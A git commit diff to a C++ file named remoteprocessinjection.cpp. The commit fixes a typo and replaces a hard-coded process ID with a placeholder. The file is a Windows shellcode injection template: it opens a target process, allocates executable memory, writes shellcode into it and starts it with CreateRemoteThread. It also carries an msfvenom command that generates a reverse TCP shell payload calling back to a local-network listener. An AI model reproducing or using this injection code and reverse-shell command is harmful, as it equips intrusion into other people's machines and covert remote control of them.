06f519fe53403e04071d4fd42e038d2d69047f31
Shinee79 <100129198+VinaySobarad@users.noreply.github.com>
2023-08-06 00:44:01 +0530

    Update remoteprocessinjection.cpp

--- remoteprocessinjection.cpp
+++ remoteprocessinjection.cpp
@@ -6,14 +6,14 @@
 
 int main(){
     char shellcode[] = {
-        "Enter yur shell code, using command:(in kali linux terminal)"
+        "Enter your shell code, using command:(in kali linux terminal)"
         "msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.9 LPORT=9999 -f c"
         };
 
     HANDLE hProcess; 
     HANDLE hThread;
     void* exec_mem;
-    hProcess= OpenProcess(PROCESS_ALL_ACCESS, TRUE, 1048);
+    hProcess= OpenProcess(PROCESS_ALL_ACCESS, TRUE, "PID");
     exec_mem = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     WriteProcessMemory(hProcess, exec_mem, shellcode, sizeof(shellcode), NULL);
     hThread= CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, 0);
